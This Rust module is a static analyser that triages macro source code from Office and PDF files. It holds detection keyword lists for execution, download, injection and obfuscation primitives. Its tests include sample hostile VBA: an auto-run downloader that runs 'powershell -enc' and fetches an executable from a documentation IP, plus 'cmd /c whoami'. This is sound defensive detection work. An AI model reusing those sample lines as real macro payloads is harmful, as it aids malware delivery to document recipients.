//! Static triage of macro source code (never executed).
//!
//! Inspired by the keyword families of `olevba`: auto-execution entry points,
//! execution / download / persistence / obfuscation primitives and IOCs.

use std::collections::BTreeSet;

use crate::report::{BehaviorKind, MacroBehavior, MacroIntent, MacroLanguage};

/// Result of analysing one module.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Analysis {
    pub(crate) auto_exec: Vec<String>,
    pub(crate) suspicious: Vec<String>,
    pub(crate) iocs: Vec<String>,
    /// What the module does, judged from its source.
    pub(crate) intent: MacroIntent,
    /// One entry per behaviour and procedure, the most serious first.
    pub(crate) behaviors: Vec<MacroBehavior>,
    /// Names of the procedures, as written.
    pub(crate) procedures: Vec<String>,
}

/// Most behaviours kept per module, and the longest line shown with one.
const MAX_BEHAVIORS: usize = 48;
const MAX_PROCEDURES: usize = 64;
const DETAIL_CHARS: usize = 140;
/// Longest stretch of source read line by line; beyond it the module counts as not fully read.
const MAX_LINES: usize = 200_000;

/// VBA procedure names Office runs automatically.
const VBA_AUTO_EXEC: &[&str] = &[
    "autoexec",
    "autoopen",
    "autoclose",
    "autoexit",
    "autonew",
    "document_open",
    "document_close",
    "document_new",
    "document_beforeclose",
    "document_contentcontrolonenter",
    "document_contentcontrolonexit",
    "documentopen",
    "documentbeforeclose",
    "newdocument",
    "auto_open",
    "auto_close",
    "auto_activate",
    "auto_deactivate",
    "workbook_open",
    "workbook_activate",
    "workbook_beforeclose",
    "workbook_deactivate",
    "workbook_beforesave",
    "workbook_sheetactivate",
    "workbook_windowactivate",
    "worksheet_activate",
    "worksheet_change",
    "worksheet_calculate",
    "worksheet_selectionchange",
    "worksheet_followhyperlink",
    "app_workbookopen",
    "app_documentopen",
    "app_newdocument",
    "document_documentopened",
    "document_beforedocumentclose",
    "visiodocument_documentopened",
    "application_startup",
    "presentation_open",
    "onslideshowpagechange",
];

/// Suffixes of ActiveX/form event handlers that fire without a deliberate click.
const VBA_AUTO_EVENT_SUFFIXES: &[&str] = &[
    "_painted",
    "_layout",
    "_resize",
    "_gotfocus",
    "_lostfocus",
    "_mousehover",
    "_mousemove",
    "_mouseenter",
    "_initialize",
    "_change",
    "_beforenavigate2",
    "_navigatecomplete2",
    "_documentcomplete",
];

/// `(needle, label, what it means)`, matched case-insensitively.
type Rule = (&'static str, &'static str, BehaviorKind);
const VBA_SUSPICIOUS: &[Rule] = &[
    ("shell(", "Shell", BehaviorKind::RunsProgram),
    ("shell ", "Shell", BehaviorKind::RunsProgram),
    ("wscript.shell", "WScript.Shell", BehaviorKind::RunsProgram),
    ("shell.application", "Shell.Application", BehaviorKind::RunsProgram),
    ("shellexecute", "ShellExecute", BehaviorKind::RunsProgram),
    ("createobject", "CreateObject", BehaviorKind::UsesComObject),
    ("getobject", "GetObject", BehaviorKind::UsesComObject),
    ("callbyname", "CallByName", BehaviorKind::RunsByName),
    ("environ", "Environ", BehaviorKind::ReadsEnvironment),
    ("urldownloadtofile", "URLDownloadToFile", BehaviorKind::DownloadsFile),
    ("xmlhttp", "XMLHTTP", BehaviorKind::DownloadsFile),
    ("winhttp", "WinHttp", BehaviorKind::DownloadsFile),
    ("msxml2", "MSXML2", BehaviorKind::DownloadsFile),
    ("adodb.stream", "ADODB.Stream", BehaviorKind::UsesComObject),
    ("savetofile", "SaveToFile", BehaviorKind::WritesFiles),
    ("powershell", "PowerShell", BehaviorKind::RunsProgram),
    ("cmd.exe", "cmd.exe", BehaviorKind::RunsProgram),
    ("cmd /c", "cmd /c", BehaviorKind::RunsProgram),
    ("mshta", "mshta", BehaviorKind::RunsProgram),
    ("rundll32", "rundll32", BehaviorKind::RunsProgram),
    ("regsvr32", "regsvr32", BehaviorKind::RunsProgram),
    ("certutil", "certutil", BehaviorKind::RunsProgram),
    ("bitsadmin", "bitsadmin", BehaviorKind::DownloadsFile),
    ("schtasks", "schtasks", BehaviorKind::ScheduledTask),
    ("wmic", "wmic", BehaviorKind::RunsProgram),
    ("winmgmts", "WMI (winmgmts)", BehaviorKind::RunsProgram),
    ("win32_process", "Win32_Process", BehaviorKind::RunsProgram),
    ("scripting.filesystemobject", "FileSystemObject", BehaviorKind::UsesComObject),
    ("createtextfile", "CreateTextFile", BehaviorKind::WritesFiles),
    ("regwrite", "RegWrite", BehaviorKind::WritesRegistry),
    ("regread", "RegRead", BehaviorKind::ReadsRegistry),
    ("virtualalloc", "VirtualAlloc", BehaviorKind::InjectsCode),
    ("virtualprotect", "VirtualProtect", BehaviorKind::InjectsCode),
    ("rtlmovememory", "RtlMoveMemory", BehaviorKind::InjectsCode),
    ("createthread", "CreateThread", BehaviorKind::InjectsCode),
    ("writeprocessmemory", "WriteProcessMemory", BehaviorKind::InjectsCode),
    ("lib \"kernel32", "Declare ... Lib kernel32", BehaviorKind::CallsNativeApi),
    ("lib \"user32", "Declare ... Lib user32", BehaviorKind::CallsNativeApi),
    ("lib \"ntdll", "Declare ... Lib ntdll", BehaviorKind::CallsNativeApi),
    ("lib \"urlmon", "Declare ... Lib urlmon", BehaviorKind::CallsNativeApi),
    ("lib \"libc.dylib", "Declare ... Lib libc (macOS)", BehaviorKind::CallsNativeApi),
    ("macscript", "MacScript", BehaviorKind::RunsProgram),
    ("applescripttask", "AppleScriptTask", BehaviorKind::RunsProgram),
    ("executeexcel4macro", "ExecuteExcel4Macro", BehaviorKind::RunsByName),
    ("application.run", "Application.Run", BehaviorKind::RunsByName),
    ("application.ontime", "Application.OnTime", BehaviorKind::RunsByName),
    ("sendkeys", "SendKeys", BehaviorKind::SendsKeys),
    ("vbproject", "VBProject (self-modifying code)", BehaviorKind::SelfModifiesCode),
    ("addfromstring", "AddFromString", BehaviorKind::SelfModifiesCode),
    ("addfromfile", "AddFromFile", BehaviorKind::SelfModifiesCode),
    ("strreverse", "StrReverse (obfuscation)", BehaviorKind::ObfuscatedCode),
    ("chrw(", "ChrW (obfuscation)", BehaviorKind::ObfuscatedCode),
    ("chrb(", "ChrB (obfuscation)", BehaviorKind::ObfuscatedCode),
    ("frombase64string", "Base64 decoding", BehaviorKind::ObfuscatedCode),
    ("base64", "Base64", BehaviorKind::ObfuscatedCode),
    ("-encodedcommand", "PowerShell -EncodedCommand", BehaviorKind::RunsProgram),
    ("-enc ", "PowerShell -enc", BehaviorKind::RunsProgram),
    (".variables(", "Document variables (hidden payload store)", BehaviorKind::HiddenPayloadStore),
    (
        "customdocumentproperties",
        "CustomDocumentProperties (hidden payload store)",
        BehaviorKind::HiddenPayloadStore,
    ),
    ("kill ", "Kill (file deletion)", BehaviorKind::DeletesFiles),
    ("for append", "Open ... For Append", BehaviorKind::WritesFiles),
    ("mkdir", "MkDir", BehaviorKind::WritesFiles),
    ("rmdir", "RmDir", BehaviorKind::DeletesFiles),
    ("for input", "Open ... For Input", BehaviorKind::ReadsLocalPaths),
    ("curdir", "CurDir", BehaviorKind::ReadsLocalPaths),
    ("application.path", "Application.Path", BehaviorKind::ReadsLocalPaths),
    ("application.defaultfilepath", "Application.DefaultFilePath", BehaviorKind::ReadsLocalPaths),
    ("activeworkbook.path", "ActiveWorkbook.Path", BehaviorKind::ReadsLocalPaths),
    ("thisworkbook.path", "ThisWorkbook.Path", BehaviorKind::ReadsLocalPaths),
    ("activedocument.path", "ActiveDocument.Path", BehaviorKind::ReadsLocalPaths),
    ("thisdocument.path", "ThisDocument.Path", BehaviorKind::ReadsLocalPaths),
    ("application.username", "Application.UserName", BehaviorKind::ReadsLocalPaths),
    ("application.organizationname", "Application.OrganizationName", BehaviorKind::ReadsLocalPaths),
    (
        "application.operatingsystem",
        "Application.OperatingSystem",
        BehaviorKind::ChecksSystemVersion,
    ),
    ("application.version", "Application.Version", BehaviorKind::ChecksSystemVersion),
    ("application.build", "Application.Build", BehaviorKind::ChecksSystemVersion),
    ("system.operatingsystem", "System.OperatingSystem", BehaviorKind::ChecksSystemVersion),
    ("filecopy", "FileCopy", BehaviorKind::WritesFiles),
    ("put #", "binary file write", BehaviorKind::WritesFiles),
    ("for binary", "Open ... For Binary", BehaviorKind::WritesFiles),
    ("for output", "Open ... For Output", BehaviorKind::WritesFiles),
];

const XLM_SUSPICIOUS: &[Rule] = &[
    ("exec(", "EXEC", BehaviorKind::RunsProgram),
    ("call(", "CALL", BehaviorKind::CallsNativeCode),
    ("register(", "REGISTER", BehaviorKind::CallsNativeCode),
    ("register.id(", "REGISTER.ID", BehaviorKind::CallsNativeCode),
    ("run(", "RUN", BehaviorKind::RunsByName),
    ("formula(", "FORMULA", BehaviorKind::SelfModifiesCode),
    ("formula.fill(", "FORMULA.FILL", BehaviorKind::SelfModifiesCode),
    ("fopen(", "FOPEN", BehaviorKind::WritesFiles),
    ("fwrite(", "FWRITE", BehaviorKind::WritesFiles),
    ("fwriteln(", "FWRITELN", BehaviorKind::WritesFiles),
    ("urldownloadtofile", "URLDownloadToFile", BehaviorKind::DownloadsFile),
    ("get.workspace(", "GET.WORKSPACE (sandbox evasion)", BehaviorKind::ChecksSystemVersion),
    ("get.window(", "GET.WINDOW", BehaviorKind::XlmMacro),
    ("get.cell(", "GET.CELL", BehaviorKind::XlmMacro),
    ("workbook.hide(", "WORKBOOK.HIDE", BehaviorKind::XlmMacro),
    ("set.name(", "SET.NAME", BehaviorKind::XlmMacro),
    ("halt(", "HALT", BehaviorKind::XlmMacro),
    ("char(", "CHAR (obfuscation)", BehaviorKind::ObfuscatedCode),
    ("shellexecute", "ShellExecute", BehaviorKind::RunsProgram),
    ("powershell", "PowerShell", BehaviorKind::RunsProgram),
    ("mshta", "mshta", BehaviorKind::RunsProgram),
    ("rundll32", "rundll32", BehaviorKind::RunsProgram),
];

const BASIC_SUSPICIOUS: &[Rule] = &[
    ("shell(", "Shell", BehaviorKind::RunsProgram),
    ("shell ", "Shell", BehaviorKind::RunsProgram),
    ("systemshellexecute", "SystemShellExecute", BehaviorKind::RunsProgram),
    ("createunoservice", "CreateUnoService", BehaviorKind::UsesComObject),
    ("com.sun.star.system", "com.sun.star.system", BehaviorKind::UsesComObject),
    ("subprocess", "subprocess", BehaviorKind::RunsProgram),
    ("os.system", "os.system", BehaviorKind::RunsProgram),
    ("os.popen", "os.popen", BehaviorKind::RunsProgram),
    ("eval(", "eval", BehaviorKind::RunsByName),
    ("exec(", "exec", BehaviorKind::RunsByName),
    ("runtime.getruntime", "Runtime.exec", BehaviorKind::RunsProgram),
    ("powershell", "PowerShell", BehaviorKind::RunsProgram),
    ("urllib", "urllib", BehaviorKind::DownloadsFile),
    ("http.client", "http.client", BehaviorKind::DownloadsFile),
];

/// Signs of ordinary work on the document: informational, they never make a module look worse.
const VBA_BENIGN: &[Rule] = &[
    (".rows.count", "Rows.Count", BehaviorKind::CountsContent),
    (".columns.count", "Columns.Count", BehaviorKind::CountsContent),
    ("computestatistics", "ComputeStatistics", BehaviorKind::CountsContent),
    ("pages.count", "Pages.Count", BehaviorKind::CountsContent),
    ("words.count", "Words.Count", BehaviorKind::CountsContent),
    ("paragraphs.count", "Paragraphs.Count", BehaviorKind::CountsContent),
    (".usedrange", "UsedRange", BehaviorKind::CountsContent),
    (".font.", "Font", BehaviorKind::FormatsContent),
    (".interior.", "Interior", BehaviorKind::FormatsContent),
    (".numberformat", "NumberFormat", BehaviorKind::FormatsContent),
    (".borders", "Borders", BehaviorKind::FormatsContent),
    (".columnwidth", "ColumnWidth", BehaviorKind::FormatsContent),
    (".rowheight", "RowHeight", BehaviorKind::FormatsContent),
    (".autofit", "AutoFit", BehaviorKind::FormatsContent),
    ("range(", "Range", BehaviorKind::EditsCells),
    ("cells(", "Cells", BehaviorKind::EditsCells),
    ("worksheets(", "Worksheets", BehaviorKind::EditsCells),
    ("sheets(", "Sheets", BehaviorKind::EditsCells),
    ("activesheet", "ActiveSheet", BehaviorKind::EditsCells),
    ("selection.typetext", "Selection.TypeText", BehaviorKind::EditsText),
    ("selection.find", "Selection.Find", BehaviorKind::EditsText),
    ("activedocument.", "ActiveDocument", BehaviorKind::EditsText),
    (".paragraphs", "Paragraphs", BehaviorKind::EditsText),
];

/// Script in a PDF (Acrobat JavaScript): what readers' exploits and phishing forms use.
const PDF_JS_SUSPICIOUS: &[Rule] = &[
    ("app.launchurl", "app.launchURL", BehaviorKind::OpensAddress),
    ("geturl(", "getURL", BehaviorKind::OpensAddress),
    ("submitform", "submitForm", BehaviorKind::OpensAddress),
    ("maildoc", "mailDoc", BehaviorKind::OpensAddress),
    ("exportdataobject", "exportDataObject", BehaviorKind::WritesFiles),
    ("importdataobject", "importDataObject", BehaviorKind::UsesComObject),
    ("unescape(", "unescape (obfuscation, heap spray)", BehaviorKind::ObfuscatedCode),
    ("fromcharcode", "String.fromCharCode (obfuscation)", BehaviorKind::ObfuscatedCode),
    ("app.viewerversion", "app.viewerVersion", BehaviorKind::ChecksSystemVersion),
    ("app.viewertype", "app.viewerType", BehaviorKind::ChecksSystemVersion),
    ("app.platform", "app.platform", BehaviorKind::ChecksSystemVersion),
    ("util.printf", "util.printf (exploit primitive)", BehaviorKind::ExploitPrimitive),
    (
        "collab.collectemailinfo",
        "Collab.collectEmailInfo (exploit primitive)",
        BehaviorKind::ExploitPrimitive,
    ),
    ("media.newplayer", "Media.newPlayer (exploit primitive)", BehaviorKind::ExploitPrimitive),
    ("%u9090", "%u9090 (heap spray)", BehaviorKind::ExploitPrimitive),
];

/// Acrobat form scripting: formats and calculates field values.
const PDF_JS_BENIGN: &[Rule] = &[
    ("afnumber_format", "AFNumber_Format", BehaviorKind::FormatsContent),
    ("afdate_format", "AFDate_Format", BehaviorKind::FormatsContent),
    ("afpercent_format", "AFPercent_Format", BehaviorKind::FormatsContent),
    ("afsimple_calculate", "AFSimple_Calculate", BehaviorKind::CountsContent),
    ("getfield(", "getField", BehaviorKind::EditsCells),
    ("event.value", "event.value", BehaviorKind::EditsCells),
];

const EXEC_EXTENSIONS: &[&str] = &[
    "exe", "dll", "scr", "pif", "com", "cpl", "msi", "bat", "cmd", "ps1", "vbs", "vbe", "js",
    "jse", "wsf", "wsh", "hta", "jar", "lnk", "sct", "xll", "iso", "img",
];

/// Analyses `source` in `language`; `truncated` says the rest of the module was not read.
pub(crate) fn analyze_module(source: &str, language: MacroLanguage, truncated: bool) -> Analysis {
    let lower = source.to_ascii_lowercase();
    let mut auto_exec: Vec<String> = Vec::new();
    let mut suspicious: Vec<String> = Vec::new();
    let mut iocs: Vec<String> = Vec::new();
    let procedures = procedure_names(source);
    let (tables, benign): (&[&[Rule]], &[Rule]) = match language {
        MacroLanguage::Vba => (&[VBA_SUSPICIOUS], VBA_BENIGN),
        MacroLanguage::Xlm => (&[XLM_SUSPICIOUS], &[]),
        MacroLanguage::StarBasic | MacroLanguage::Python | MacroLanguage::BeanShell => {
            (&[BASIC_SUSPICIOUS], &[])
        }
        MacroLanguage::JavaScript => (&[BASIC_SUSPICIOUS, PDF_JS_SUSPICIOUS], PDF_JS_BENIGN),
    };
    match language {
        MacroLanguage::Vba => {
            for proc in &procedures {
                let low = proc.to_ascii_lowercase();
                if VBA_AUTO_EXEC.contains(&low.as_str())
                    || VBA_AUTO_EVENT_SUFFIXES.iter().any(|s| low.ends_with(s))
                {
                    push_unique(&mut auto_exec, proc.clone());
                }
            }
        }
        MacroLanguage::Xlm => {}
        MacroLanguage::StarBasic
        | MacroLanguage::Python
        | MacroLanguage::JavaScript
        | MacroLanguage::BeanShell => {
            for proc in &procedures {
                if matches!(proc.to_ascii_lowercase().as_str(), "main" | "onload" | "autoexec") {
                    push_unique(&mut auto_exec, proc.clone());
                }
            }
        }
    }
    for url in crate::url::find_urls(source, 32) {
        push_unique(&mut iocs, url);
    }
    for ip in find_ipv4(source, 16) {
        push_unique(&mut iocs, ip);
    }
    for name in find_exec_names(&lower, 16) {
        push_unique(&mut iocs, name);
    }

    let mut found = Found::default();
    let mut current = String::new();
    let mut cut = truncated;
    let mut chr = ChrCalls::default();
    for (n, line) in source.lines().enumerate() {
        if n >= MAX_LINES {
            cut = true;
            break;
        }
        if let Some(name) = procedure_name_of(line) {
            if auto_exec.iter().any(|a| a.eq_ignore_ascii_case(&name)) {
                found.add(BehaviorKind::AutoRuns, &name, line);
            }
            current = name;
            continue;
        }
        let t = line.trim();
        if is_procedure_end(t) {
            current.clear();
            continue;
        }
        if t.is_empty() || is_comment(t, language) {
            continue;
        }
        let low = line.to_ascii_lowercase();
        for table in tables {
            for (needle, label, kind) in *table {
                if low.contains(needle) {
                    push_unique(&mut suspicious, (*label).to_owned());
                    found.add(*kind, &current, line);
                }
            }
        }
        for (needle, _, kind) in benign {
            if low.contains(needle) {
                found.add_once(*kind, &current, line);
            }
        }
        if has_string_pieces(&low) || has_long_literal(line) {
            found.add(BehaviorKind::ObfuscatedCode, &current, line);
        }
        chr.count(&low);
    }
    if chr.looks_built() {
        found.add_summary(BehaviorKind::ObfuscatedCode, "characters are built one by one with Chr");
    }
    if iocs.iter().any(|i| i.contains("://") || i.chars().all(|c| c.is_ascii_digit() || c == '.')) {
        let first = iocs
            .iter()
            .find(|i| i.contains("://") || i.chars().all(|c| c.is_ascii_digit() || c == '.'));
        found.add_summary(BehaviorKind::ContainsAddress, first.map_or("", String::as_str));
    }
    if let Some(program) = iocs.iter().find(|i| {
        !i.contains("://") && i.contains('.') && !i.chars().all(|c| c.is_ascii_digit() || c == '.')
    }) {
        found.add_summary(BehaviorKind::MentionsProgram, program);
    }
    if language == MacroLanguage::Xlm {
        found.add_summary(BehaviorKind::XlmMacro, "Excel 4.0 macro sheet");
    }
    if cut {
        found.add_summary(BehaviorKind::NotFullyRead, "the rest of the module was not read");
    }

    let mut behaviors = found.behaviors;
    // The most serious first; the order they were found in otherwise.
    behaviors.sort_by_key(|b| core::cmp::Reverse(b.kind.intent()));
    let mut intent = behaviors.iter().map(|b| b.kind.intent()).max().unwrap_or(MacroIntent::Benign);
    // Starting by itself and hiding what it does is how a loader is built.
    if intent >= MacroIntent::Suspicious
        && behaviors.iter().any(|b| b.kind == BehaviorKind::AutoRuns)
        && behaviors.iter().any(|b| b.kind == BehaviorKind::ObfuscatedCode)
    {
        intent = MacroIntent::Malicious;
    }
    Analysis {
        auto_exec,
        suspicious,
        iocs,
        intent,
        behaviors,
        procedures: procedures.into_iter().take(MAX_PROCEDURES).collect(),
    }
}

/// Behaviours found so far.
#[derive(Default)]
struct Found {
    behaviors: Vec<MacroBehavior>,
    seen: BTreeSet<(BehaviorKind, String)>,
    once: BTreeSet<BehaviorKind>,
}

impl Found {
    /// One entry per behaviour and procedure.
    fn add(&mut self, kind: BehaviorKind, procedure: &str, line: &str) {
        if self.behaviors.len() < MAX_BEHAVIORS && self.seen.insert((kind, procedure.to_owned())) {
            self.behaviors.push(MacroBehavior {
                kind,
                procedure: procedure.to_owned(),
                detail: arca_container::text::display_safe(line.trim(), DETAIL_CHARS),
            });
        }
    }

    /// One entry per behaviour in the whole module (signs of ordinary work).
    fn add_once(&mut self, kind: BehaviorKind, procedure: &str, line: &str) {
        if self.once.insert(kind) {
            self.add(kind, procedure, line);
        }
    }

    /// A behaviour of the module as a whole, with a short description instead of a line.
    fn add_summary(&mut self, kind: BehaviorKind, what: &str) {
        self.add(kind, "", what);
    }
}

/// How many characters a module builds from numbers: the way text is hidden from a reader.
#[derive(Default)]
struct ChrCalls {
    printable_literals: usize,
    computed: usize,
}

impl ChrCalls {
    fn count(&mut self, lower_line: &str) {
        for needle in ["chr(", "chrw(", "chrb("] {
            let mut rest = lower_line;
            while let Some(at) = rest.find(needle) {
                let after = rest.get(at + needle.len()..).unwrap_or("");
                let arg = after.split(')').next().unwrap_or("").trim();
                if !arg.is_empty() && arg.bytes().all(|b| b.is_ascii_digit()) {
                    // 10, 13, 9 and 34 are line breaks, tabs and quotes: ordinary.
                    if arg.parse::<u32>().is_ok_and(|v| v >= 32 && v != 34) {
                        self.printable_literals += 1;
                    }
                } else {
                    self.computed += 1;
                }
                rest = after;
            }
        }
    }

    fn looks_built(&self) -> bool {
        self.printable_literals >= 5 || self.computed >= 3
    }
}

/// Four or more string literals joined with `&` or `+` on one line: text assembled from pieces.
fn has_string_pieces(lower_line: &str) -> bool {
    if !lower_line.contains('&') && !lower_line.contains('+') {
        return false;
    }
    let compact: String = lower_line.chars().filter(|c| !c.is_whitespace()).collect();
    compact.matches("\"&\"").count() + compact.matches("\"+\"").count() >= 3
}

/// A text literal of 200 or more characters: an encoded payload rather than a message.
fn has_long_literal(line: &str) -> bool {
    line.split('"').skip(1).step_by(2).any(|s| s.len() >= 200)
}

fn is_comment(t: &str, language: MacroLanguage) -> bool {
    match language {
        MacroLanguage::Python => t.starts_with('#'),
        MacroLanguage::JavaScript | MacroLanguage::BeanShell => t.starts_with("//"),
        MacroLanguage::Xlm => false,
        MacroLanguage::Vba | MacroLanguage::StarBasic => {
            t.starts_with('\'')
                || strip_prefix_ci(t, "rem ").is_some()
                || t.eq_ignore_ascii_case("rem")
        }
    }
}

fn is_procedure_end(t: &str) -> bool {
    ["end sub", "end function", "end property"].iter().any(|p| strip_prefix_ci(t, p).is_some())
}

fn push_unique(v: &mut Vec<String>, s: String) {
    if !v.contains(&s) {
        v.push(s);
    }
}

/// `s` without the ASCII-case-insensitive `prefix`.
fn strip_prefix_ci<'a>(s: &'a str, prefix: &str) -> Option<&'a str> {
    let head = s.get(..prefix.len())?;
    head.eq_ignore_ascii_case(prefix).then(|| s.get(prefix.len()..)).flatten()
}

/// The name of the procedure a line defines (`Sub`, `Function`, `def`), in the case it was written in.
fn procedure_name_of(line: &str) -> Option<String> {
    let mut t = line.trim_start();
    for prefix in ["private ", "public ", "friend ", "static "] {
        if let Some(rest) = strip_prefix_ci(t, prefix) {
            t = rest.trim_start();
        }
    }
    let rest = strip_prefix_ci(t, "sub ")
        .or_else(|| strip_prefix_ci(t, "function "))
        .or_else(|| strip_prefix_ci(t, "def "))?;
    let name: String =
        rest.trim_start().chars().take_while(|c| c.is_alphanumeric() || *c == '_').collect();
    (!name.is_empty()).then_some(name)
}

/// Names of `Sub`/`Function` definitions, in the case they were written in, without repeats.
fn procedure_names(source: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::new();
    for line in source.lines() {
        if let Some(name) = procedure_name_of(line)
            && out.len() < 4096
            && seen.insert(name.to_ascii_lowercase())
        {
            out.push(name);
        }
    }
    out
}

fn find_ipv4(text: &str, max: usize) -> Vec<String> {
    let mut out = Vec::new();
    for token in text.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
        if out.len() >= max {
            break;
        }
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() == 4
            && parts
                .iter()
                .all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u16>().is_ok_and(|v| v <= 255))
            && token != "0.0.0.0"
            && !token.starts_with("1.0.")
        {
            push_unique(&mut out, token.to_owned());
        }
    }
    out
}

fn find_exec_names(lower: &str, max: usize) -> Vec<String> {
    let mut out = Vec::new();
    for token in lower.split(|c: char| {
        c.is_whitespace() || matches!(c, '"' | '\'' | '(' | ')' | ',' | '\\' | '/' | '&' | '=')
    }) {
        if out.len() >= max {
            break;
        }
        if let Some((stem, ext)) = token.rsplit_once('.')
            && !stem.is_empty()
            && stem.chars().all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | '%' | '$'))
            && EXEC_EXTENSIONS.contains(&ext)
        {
            push_unique(&mut out, token.to_owned());
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(source: &str, language: MacroLanguage) -> Analysis {
        analyze_module(source, language, false)
    }

    #[test]
    fn classic_downloader_is_triaged() {
        let src = "Attribute VB_Name = \"ThisDocument\"\r\nPrivate Sub Document_Open()\r\n  Set x = CreateObject(\"WScript.Shell\")\r\n  x.Run \"powershell -enc AAAA\"\r\n  URLDownloadToFile 0, \"http://203.0.113.7/p.exe\", Environ(\"TEMP\") & \"\\p.exe\", 0, 0\r\nEnd Sub\r\nSub CommandButton1_Click()\r\nEnd Sub\r\nSub InkPicture1_Painted()\r\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.auto_exec, vec!["Document_Open".to_owned(), "InkPicture1_Painted".to_owned()]);
        for k in ["CreateObject", "WScript.Shell", "PowerShell", "URLDownloadToFile", "Environ"] {
            assert!(a.suspicious.iter().any(|s| s == k), "{k} missing in {:?}", a.suspicious);
        }
        assert!(a.iocs.contains(&"http://203.0.113.7/p.exe".to_owned()));
        assert!(a.iocs.contains(&"203.0.113.7".to_owned()));
        assert!(a.iocs.iter().any(|i| i == "p.exe"));
    }

    #[test]
    fn benign_module_is_quiet() {
        let a =
            analyze("Sub FormatTable()\n Selection.Font.Bold = True\nEnd Sub", MacroLanguage::Vba);
        assert!(a.auto_exec.is_empty() && a.suspicious.is_empty() && a.iocs.is_empty(), "{a:?}");
    }

    #[test]
    fn xlm_keywords() {
        let a = analyze("=EXEC(\"calc.exe\")\n=HALT()", MacroLanguage::Xlm);
        assert!(a.suspicious.contains(&"EXEC".to_owned()));
        assert!(a.suspicious.contains(&"HALT".to_owned()));
        assert!(a.iocs.contains(&"calc.exe".to_owned()));
    }

    // ---- intent ---------------------------------------------------------------------------

    fn kinds(a: &Analysis) -> Vec<BehaviorKind> {
        a.behaviors.iter().map(|b| b.kind).collect()
    }

    #[test]
    fn a_macro_that_counts_pages_and_columns_is_benign_and_says_where() {
        let src = "Attribute VB_Name = \"NewMacros\"\r\nSub CountPages()\r\n  Dim n As Long\r\n  n = ActiveDocument.ComputeStatistics(wdStatisticPages)\r\n  MsgBox \"Pages: \" & n & \", columns: \" & ActiveDocument.Sections(1).PageSetup.TextColumns.Count\r\nEnd Sub\r\n";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Benign, "{:?}", a.behaviors);
        assert!(a.auto_exec.is_empty() && a.suspicious.is_empty() && a.iocs.is_empty());
        assert_eq!(a.procedures, vec!["CountPages".to_owned()]);
        // It says what the macro does and in which procedure.
        let counts = a.behaviors.iter().find(|b| b.kind == BehaviorKind::CountsContent);
        assert!(counts.is_some_and(|b| b.procedure == "CountPages"), "{:?}", a.behaviors);
        assert!(a.behaviors.iter().all(|b| b.kind.intent() == MacroIntent::Benign));
    }

    #[test]
    fn formatting_and_cell_work_is_benign() {
        let src = "Sub Tidy()\n  Dim last As Long\n  last = Cells(Rows.Count, 1).End(xlUp).Row\n  Range(\"A1:D\" & last).Font.Bold = True\n  Columns(\"A:D\").AutoFit\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Benign, "{:?}", a.behaviors);
        for k in [BehaviorKind::FormatsContent, BehaviorKind::EditsCells] {
            assert!(kinds(&a).contains(&k), "{k:?} in {:?}", kinds(&a));
        }
    }

    #[test]
    fn starting_by_itself_or_reading_the_surroundings_is_suspicious_not_malicious() {
        let auto = "Sub Workbook_Open()\n  Range(\"A1\").Value = 1\nEnd Sub";
        let a = analyze(auto, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Suspicious, "{:?}", a.behaviors);
        assert!(
            a.behaviors
                .iter()
                .any(|b| b.kind == BehaviorKind::AutoRuns && b.procedure == "Workbook_Open")
        );

        let env = "Function Where()\n  Where = Environ(\"USERNAME\") & Application.OperatingSystem\nEnd Function";
        let a = analyze(env, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Suspicious, "{:?}", a.behaviors);
        for k in [BehaviorKind::ReadsEnvironment, BehaviorKind::ChecksSystemVersion] {
            assert!(kinds(&a).contains(&k), "{k:?} in {:?}", kinds(&a));
        }
        let paths = analyze("Sub P()\n  x = ThisWorkbook.Path\nEnd Sub", MacroLanguage::Vba);
        assert_eq!(paths.intent, MacroIntent::Suspicious);
        let com = analyze(
            "Sub C()\n  Set o = CreateObject(\"Scripting.Dictionary\")\nEnd Sub",
            MacroLanguage::Vba,
        );
        assert_eq!(com.intent, MacroIntent::Suspicious);
    }

    #[test]
    fn programs_downloads_files_registry_and_shellcode_are_malicious() {
        for (src, want) in [
            ("Sub A()\n Shell \"calc.exe\"\nEnd Sub", BehaviorKind::RunsProgram),
            ("Sub A()\n x.Run \"powershell -enc AAAA\"\nEnd Sub", BehaviorKind::RunsProgram),
            (
                "Sub A()\n URLDownloadToFile 0, \"http://203.0.113.9/a\", \"c:\\a\", 0, 0\nEnd Sub",
                BehaviorKind::DownloadsFile,
            ),
            ("Sub A()\n Open \"c:\\x.bin\" For Binary As #1\nEnd Sub", BehaviorKind::WritesFiles),
            ("Sub A()\n Kill \"c:\\x.doc\"\nEnd Sub", BehaviorKind::DeletesFiles),
            ("Sub A()\n sh.RegWrite \"HKCU\\x\", 1\nEnd Sub", BehaviorKind::WritesRegistry),
            ("Sub A()\n p = VirtualAlloc(0, 100, 4096, 64)\nEnd Sub", BehaviorKind::InjectsCode),
            ("Sub A()\n Shell \"schtasks /create\"\nEnd Sub", BehaviorKind::ScheduledTask),
            (
                "Sub A()\n ThisWorkbook.VBProject.VBComponents(1).CodeModule.AddFromString s\nEnd Sub",
                BehaviorKind::SelfModifiesCode,
            ),
        ] {
            let a = analyze(src, MacroLanguage::Vba);
            assert_eq!(a.intent, MacroIntent::Malicious, "{src}: {:?}", a.behaviors);
            assert!(kinds(&a).contains(&want), "{want:?} in {:?} for {src}", kinds(&a));
        }
    }

    #[test]
    fn a_malicious_behaviour_comes_first_and_names_its_procedure_and_line() {
        let src = "Sub Quiet()\n  Range(\"A1\").Value = 1\nEnd Sub\nSub Loud()\n  Set s = CreateObject(\"WScript.Shell\")\n  s.Run \"cmd /c whoami\"\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.intent, MacroIntent::Malicious);
        let first = &a.behaviors[0];
